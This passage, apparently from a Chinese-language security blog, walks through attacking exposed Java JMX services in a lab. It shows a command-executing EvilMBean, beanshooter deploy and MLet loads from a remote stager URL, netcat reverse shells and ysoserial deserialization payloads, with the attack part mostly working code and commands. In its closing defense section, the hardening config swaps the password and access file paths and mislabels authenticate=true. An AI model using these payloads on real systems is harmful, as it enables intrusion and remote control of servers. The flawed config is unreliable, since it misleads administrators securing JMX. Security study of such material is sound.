+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>在启动 Java 应用时添加参数：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#58a1dd">java</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">Dcom</span>.<span style="color:#58a1dd">sun</span>.<span style="color:#58a1dd">management</span>.<span style="color:#58a1dd">jmxremote</span> \
+</span></span><span style="display:flex;"><span>     <span style="color:#ff636f">-</span><span style="color:#58a1dd">Dcom</span>.<span style="color:#58a1dd">sun</span>.<span style="color:#58a1dd">management</span>.<span style="color:#58a1dd">jmxremote</span>.<span style="color:#58a1dd">port</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">12345</span> \       # <span style="color:#58a1dd">JMX</span> <span style="color:#58a1dd">监听端口</span>
+</span></span><span style="display:flex;"><span>     <span style="color:#ff636f">-</span><span style="color:#58a1dd">Dcom</span>.<span style="color:#58a1dd">sun</span>.<span style="color:#58a1dd">management</span>.<span style="color:#58a1dd">jmxremote</span>.<span style="color:#58a1dd">rmi</span>.<span style="color:#58a1dd">port</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">12345</span> \   # <span style="color:#58a1dd">RMI</span> <span style="color:#58a1dd">注册端口</span>（<span style="color:#58a1dd">通常与</span> <span style="color:#58a1dd">JMX</span> <span style="color:#58a1dd">端口相同</span>）
+</span></span><span style="display:flex;"><span>     <span style="color:#ff636f">-</span><span style="color:#58a1dd">Dcom</span>.<span style="color:#58a1dd">sun</span>.<span style="color:#58a1dd">management</span>.<span style="color:#58a1dd">jmxremote</span>.<span style="color:#58a1dd">authenticate</span><span style="color:#ff636f">=</span><span style="color:#ff636f">false</span> \  # <span style="color:#58a1dd">禁用认证</span>（<span style="color:#58a1dd">仅测试用</span>）
+</span></span><span style="display:flex;"><span>     <span style="color:#ff636f">-</span><span style="color:#58a1dd">Dcom</span>.<span style="color:#58a1dd">sun</span>.<span style="color:#58a1dd">management</span>.<span style="color:#58a1dd">jmxremote</span>.<span style="color:#58a1dd">ssl</span><span style="color:#ff636f">=</span><span style="color:#ff636f">false</span> \         # <span style="color:#58a1dd">禁用</span> <span style="color:#58a1dd">SSL</span>（<span style="color:#58a1dd">仅测试用</span>）
+</span></span><span style="display:flex;"><span>     <span style="color:#ff636f">-</span><span style="color:#58a1dd">jar</span> <span style="color:#58a1dd">your</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">application</span>.<span style="color:#58a1dd">jar</span></span></span></code></pre></div><h1 id="攻击姿势" class="heading-element"><span>攻击姿势</span>
+  <a href="#%e6%94%bb%e5%87%bb%e5%a7%bf%e5%8a%bf" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><h2 id="自定义类" class="heading-element"><span>自定义类</span>
+  <a href="#%e8%87%aa%e5%ae%9a%e4%b9%89%e7%b1%bb" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 id="自定义类-1" class="heading-element"><span>自定义类</span>
+  <a href="#%e8%87%aa%e5%ae%9a%e4%b9%89%e7%b1%bb-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>使用工具向JMX服务端注册恶意MBean：</p>
+<p>Step 1：编写一个EvilMBean接口</p>
+<pre tabindex="0"><code>public interface EvilMBean {
+    public String runCommand(String cmd);
+}</code></pre><p>Step 2：编写EvilMBean的实现</p>
+<pre tabindex="0"><code>import java.io.*;
+
+public class Evil implements EvilMBean {
+    @Override
+    public String runCommand(String cmd) {
+        try {
+            Runtime rt = Runtime.getRuntime();
+            Process proc = rt.exec(cmd);
+            BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
+            BufferedReader stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
+            String stdout_err_data = &#34;&#34;;
+            String s;
+            while ((s = stdInput.readLine()) != null) {
+                stdout_err_data += s + &#34;\n&#34;;
+            }
+            while ((s = stdError.readLine()) != null) {
+                stdout_err_data += s + &#34;\n&#34;;
+            }
+
+            proc.waitFor();
+            return stdout_err_data;
+        } catch (Exception e) {
+            return e.toString();
+        }
+    }
+}</code></pre><p>随后将上述两个java程序编译后打包成jar包：</p>
+<pre tabindex="0"><code>javac Evil.java EvilMBean.java
+jar -cvf JMXPayload.jar Evil.class EvilMBean.class</code></pre><p>Step 4：随后使用python来启动一个简单的HTTP服务托管JMXPayload.jar</p>
+<pre tabindex="0"><code>python2 -m SimpleHTTPServer 4141</code></pre><p>Step 5：使用beanshooter来部署jar</p>
+<pre tabindex="0"><code>java -jar beanshooter.jar deploy 127.0.0.1 9999 Evil com.al1ex:type=Example --jar-file JMXPayload.jar --stager-url http://127.0.0.1:4141</code></pre><table>
+<thead>
+<tr>
+<th style="text-align:center">参数</th>
+<th style="text-align:center">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><code>deploy</code></td>
+<td style="text-align:center">操作模式（部署恶意 MBean）</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>10.1.200.1</code></td>
+<td style="text-align:center">目标 JMX 服务器 IP</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>9999</code></td>
+<td style="text-align:center">目标 JMX 服务器端口</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>Evil</code></td>
+<td style="text-align:center">恶意 MBean 的名称（用于注册）</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>com.al1ex:type=Example</code></td>
+<td style="text-align:center">恶意 MBean 的 ObjectName（JMX 注册名称）</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>--jar-file JMXPayload.jar</code></td>
+<td style="text-align:center">指定恶意 JAR 文件路径</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>--stager-url http://10.1.200.1:4141</code></td>
+<td style="text-align:center">指定远程 Stager URL（用于加载恶意类）</td>
+</tr>
+</tbody>
+</table>
+<p>随后直接远程链接并执行命令即可</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505211712187.png" alt="image-20250521171201055" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505211712187.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505211712187.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505211712187.png?size=large 2x" data-title="image-20250521171201055" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="命令执行" class="heading-element"><span>命令执行</span>
+  <a href="#%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Step 1：使用mlet加载tonka MBeans</p>
+<pre tabindex="0"><code>java -jar beanshooter.jar mlet load 172.17.0.2 9010 tonka http://172.17.0.1:8000</code></pre><p>Step 2：借助tonka来执行命令</p>
+<pre tabindex="0"><code>java -jar beanshooter.jar tonka exec 172.17.0.2 9010 id</code></pre><p>最后我们要对加载的恶意的MBean做一个清理处理(根据上面的Object名称来传参)</p>
+<pre tabindex="0"><code>java -jar beanshooter.jar undeploy 172.17.0.2 9010 MLetTonkaBean:name=TonkaBean,id=1</code></pre><h2 id="反弹shell" class="heading-element"><span>反弹shell</span>
+  <a href="#%e5%8f%8d%e5%bc%b9shell" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>借助standard模块操作来反弹shell：</p>
+<pre tabindex="0"><code>java -jar beanshooter.jar standard 172.17.0.2 9010 exec &#39;nc 172.17.0.1 4444 -e ash&#39;</code></pre><h2 id="认证模式" class="heading-element"><span>认证模式</span>
+  <a href="#%e8%ae%a4%e8%af%81%e6%a8%a1%e5%bc%8f" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Step 1：开启监听</p>
+<pre tabindex="0"><code>nc -lnvp 1234</code></pre><p>Step 2：发起反序列化请求，如果出现下面的错误提示则说明是未配置yso.jar的路径</p>
+<pre tabindex="0"><code>java -jar beanshooter.jar serial 172.17.0.2 1090 CommonsCollections6 &#34;nc 172.17.0.1 1234 -e ash&#34; --username admin --password admin</code></pre><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505211742690.png" alt="image-20250521174227569" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505211742690.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505211742690.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505211742690.png?size=large 2x" data-title="image-20250521174227569" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>随后正常执行后可以成功反弹shell回来</p>
+<h3 id="preauth" class="heading-element"><span>preauth</span>
+  <a href="#preauth" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>JMX服务也容易受到预先验证的反序列化攻击，要滥用这一点，您可以使用-preauth开关，而这个利用其实是RMI-JRMP的实现：</p>
+<pre tabindex="0"><code>java -jar beanshooter.jar serial 172.17.0.2 1090 CommonsCollections6 &#34;nc 172.17.0.1 4444 -e ash&#34; --preauth</code></pre><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505211742253.png" alt="image-20250521174252126" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505211742253.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505211742253.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505211742253.png?size=large 2x" data-title="image-20250521174252126" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h1 id="认证绕过" class="heading-element"><span>认证绕过</span>
+  <a href="#%e8%ae%a4%e8%af%81%e7%bb%95%e8%bf%87" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p>如果开启认证则上面的几种攻击方式是不能打的(未知账户/密码的情况下):</p>
+<p><a href="https://github.com/openjdk-mirror/jdk7u-jdk/blob/f4d80957e89a19a29bb9f9807d2a28351ed7f7df/src/share/classes/com/sun/jmx/remote/security/MBeanServerAccessController.java#L619"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/openjdk-mirror/jdk7u-jdk/blob/f4d80957e89a19a29bb9f9807d2a28351ed7f7df/src/share/classes/com/sun/jmx/remote/security/MBeanServerAccessController.java#L619</a></p>
+<p>ysoserial在2019年5月份的时候添加了一个新的模块，通过它可以来打认证后的MBean服务</p>
+<p><a href="https://github.com/frohoff/ysoserial/commit/55f1e7c35cabb454385fca14be03b80129cfa62e"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/frohoff/ysoserial/commit/55f1e7c35cabb454385fca14be03b80129cfa62e</a></p>
+<p>实现原理就是调用一个MBean方法，该方法接受String(或任何其他类)作为参数，如果将String类型的参数替换为gadget，ysoserial工具实现就是将默认Mbean中java.util.logging:type=Logging中的getLoggerLevel参数进行替换，当然服务器上必须存在有gadget的jar包，我这里测试的用的是CommonsBeanutils1：</p>
+<pre tabindex="0"><code>&#34;C:\Program Files\Java\jdk1.8.0_102\bin\java.exe&#34; -cp ysoserial.jar ysoserial.exploit.JMXInvokeMBean 127.0.0.1 9999 CommonsBeanutils1 calc.exe</code></pre><p>通过代码实现(需要导入ysoserial.jar包)：</p>
+<pre tabindex="0"><code>package JMX_Remote;
+
+import javax.management.MBeanServerConnection;
+import javax.management.ObjectName;
+import javax.management.remote.*;
+import ysoserial.payloads.ObjectPayload.Utils;
+
+public class jmxInvoke {
+    public static void main(String[] args) throws Exception {
+        JMXServiceURL url = new JMXServiceURL(&#34;service:jmx:rmi:///jndi/rmi://192.168.174.153:9999/jmxrmi&#34;);
+        JMXConnector jmxConnector = JMXConnectorFactory.connect(url);
+        MBeanServerConnection mbeanServerConnection = jmxConnector.getMBeanServerConnection();
+
+        ObjectName mbeanName = new ObjectName(&#34;java.util.logging:type=Logging&#34;);
+        Object payloadobject = Utils.makePayloadObject(&#34;Jdk7u21&#34;,&#34;calc.exe&#34;);
+        mbeanServerConnection.invoke(mbeanName,&#34;getLoggerLevel&#34;,new Object[]{payloadobject}, new String[]{String.class.getCanonicalName()});
+    }
+}</code></pre><h1 id="防御" class="heading-element"><span>防御</span>
+  <a href="#%e9%98%b2%e5%be%a1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p>(1) 结合业务进行安全考虑，如果不需要JMX服务可以关闭</p>
+<p>(2) 如果需要开启则建议启用认证，同时妥善保管认证信息：</p>
+<p>a、首先创建一个jmxremote.access文件，用于定义哪些用户可以访问JMX服务</p>
+<pre tabindex="0"><code>#格式示例
+用户名         权限
+monitorRole   readonly
+controlRole   readwrite
+
+
+#简易示例
+monitorRole readonly
+controlRole readwrite</code></pre><p>b、创建一个jmxremote.password文件用于定义用户密码</p>
+<pre tabindex="0"><code>#文件格式
+用户名 密码
+
+#简易示例
+monitorRole password123
+controlRole password456</code></pre><p>c、配置JMX Agent以使用上述文件</p>
+<pre tabindex="0"><code>#格式说明
+-Dcom.sun.management.jmxremote.port=9999                                #指定端口
+-Dcom.sun.management.jmxremote.authenticate=true                        #指定不需要用户名与密码
+-Dcom.sun.management.jmxremote.ssl=false                                #不采用HTTPS连接
+-Dcom.sun.management.jmxremote.password.file=/path/to/jmxremote.access      #密码文件
+-Dcom.sun.management.jmxremote.access.file=/path/to/jmxremote.password      #权限文件
+
+#简易示例
+-Dcom.sun.management.jmxremote.port=9999                                    
+-Dcom.sun.management.jmxremote.authenticate=true                            
+-Dcom.sun.management.jmxremote.ssl=false                                    
+-Dcom.sun.management.jmxremote.password.file=jmxremote.access       
+-Dcom.sun.management.jmxremote.access.file=jmxremote.password</code></pre><p>d、运行应用后使用jsconsole进行访问可以看到需要身份认证</p>
+<h1 id="other" class="heading-element"><span>Other</span>
+  <a href="#other" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><h3 id="监控-spring-boot" class="heading-element"><span><strong>监控 Spring Boot</strong></span>
+  <a href="#%e7%9b%91%e6%8e%a7-spring-boot" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>Spring Boot 默认集成 Actuator，可通过 <code>/actuator/jolokia</code> 暴露 JMX 数据（需添加依赖）：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#58a1dd">&lt;dependency&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">&lt;groupId&gt;</span>org.springframework.boot<span style="color:#58a1dd">&lt;/groupId&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">&lt;artifactId&gt;</span>spring-boot-actuator<span style="color:#58a1dd">&lt;/artifactId&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">&lt;/dependency&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">&lt;dependency&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">&lt;groupId&gt;</span>org.jolokia<span style="color:#58a1dd">&lt;/groupId&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">&lt;artifactId&gt;</span>jolokia-core<span style="color:#58a1dd">&lt;/artifactId&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">&lt;/dependency&gt;</span></span></span></code></pre></div><p>参考：https://xz.aliyun.com/news/15854</p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2025-05-21 21:11:01">Updated on 2025-05-21&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-tag" title="Tags - 代码审计">代码审计</a><a href="/tags/java%E5%AE%89%E5%85%A8/" class="post-tag" title="Tags - Java安全">Java安全</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E6%9C%A8%E9%A9%AC/java%E5%86%85%E5%AD%98%E9%A9%AC-listener/" class="post-nav-item" rel="prev" title="Java内存马-Listener"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Java内存马-Listener</a>
+      <a href="/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80/jdwp%E5%88%9D%E8%AF%86/" class="post-nav-item" rel="next" title="JDWP初识">JDWP初识<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">
